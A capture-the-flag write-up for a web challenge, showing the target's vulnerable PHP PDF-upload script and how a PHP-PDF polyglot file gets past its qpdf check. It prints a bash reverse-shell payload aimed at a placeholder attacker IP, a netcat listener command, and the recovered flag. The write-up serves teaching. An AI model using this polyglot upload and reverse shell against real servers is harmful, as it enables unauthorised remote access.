# Supreme PDF Hoster

## 200 Points - Web & Forensics

*Greetings Agent*
*One of our agents, Agent Gayyang managed to infiltrate the servers and obtained sensitive information of Snail Speed Corporation, which we suspect has conducted horrible crimes against humanity. However, their security team was right on his trail, and to prevent himself from being discovered, he quickly dumped the file into a random PDF hosting site controlled by someone who is paranoid about privacy and refuses to cooporate with us. Site Here. (Link has been removed, please access it from the platform)

*Your mission, should you choose to accept, is to infiltrate the PDF Hosting site and retrieve the file that is now held and hidden by the paranoid site owner. We have managed to obtain the PHP source code of the site as the owner bragged at how his site was "impenetrable even if we have the source code".*

We are also given the source code of the webpage below:

```php
<?php

$target_dir = "uploads/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
$uploadOk = 1;
// Check if image file is an actual PDF. Those damn hackers can't get past these hahahahaha!
if(isset($_POST["submit"])) {
  $file = $_FILES["fileToUpload"]["tmp_name"];
$output = "";
$file = escapeshellarg($file);
$command = "qpdf --check " . $file. " 2>&1";
$output = shell_exec($command);

if (strpos($output, "file is damaged") === false) {
		if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
   		 echo "Success! Your PDF file is now availble for viewing ";
		echo "<a href='uploads/".$_FILES["fileToUpload"]["name"]."'>here</a>";
		echo ". Thank you for using surpreme PDF Hoster";
	}
	else { 	
		echo "Whoops, error while uploading PDF file. Please contact tkai";
	}
}
else {
	echo "Please upload a valid PDF file! No tricks!";
}
}

?>
```

There is a shell_exec in the source code. However, the filename is first passed through escapeshellargs(), not to mention it is only a temp fall name and not the actual file name. So executing arbitrary commands via shell_exec() seems to be out of the option. (*Maybe you guys can make use of it idk, not a web expert ​*:stuck_out_tongue:)

When we upload a PDF file, it gives us a link to the PDF file where we can view it. It also seems like it **does not check for the file extension**, but it does **pass it through `qpdf --check`**, which will report any errors if there are errors in the PDF, or if it is not a valid PDF file. So passing in a php file won't seem to work. (Or will it? :thinking:)

My intention for this challenge was to explore the use of polyglots. In particular, a `PHP-PDF Polyglot` file, which will open as a valid PDF file with not a single error, and behave as a PHP file when renamed to a .php file. If you read about more about Polyglot files [here](https://fahrplan.events.ccc.de/congress/2014/Fahrplan/system/attachments/2562/original/Funky_File_Formats.pdf), you will learn that PDF files **do not care about when their headers start**. Hence, you can insert PHP code at the front of a PDF file and it won't complain the slightest bit.

Here is an example of an exploit:

```php
//exploit2.php
//Note: it uses /bin/sh instead of /bin/bash, so the following payload is necessarry
<?php echo(exec("bash -c 'bash -i >& /dev/tcp/<Attack_server_ip>/4444 0>&1'")); ?>
%PDF-1.5
%ÐÔÅØ
3 0 obj
<<
...
```

After we upload exploit2.php, we can then run

```bash
nc -lnvp 4444
```

on a public server (or portforwarded home network) to receive the connection, then visit the reverse shell to run it and get a shell on the server.

After getting the shell on the server, moving back 2 times `../../`, will reveal a `Snail_speed_corp_trade_secrets.pdf`. Opening it reveals a quote talking about **secrets hidden within it**. **Binwalking** the PDF will reveal a jpeg hidden inside, and opening it reveals the flag:

```
IRS{P0lY_g0t?_300L!}
```



### (Intended) Learning Points:

- Polyglot Files :smile:
- Simple reverse shell basics
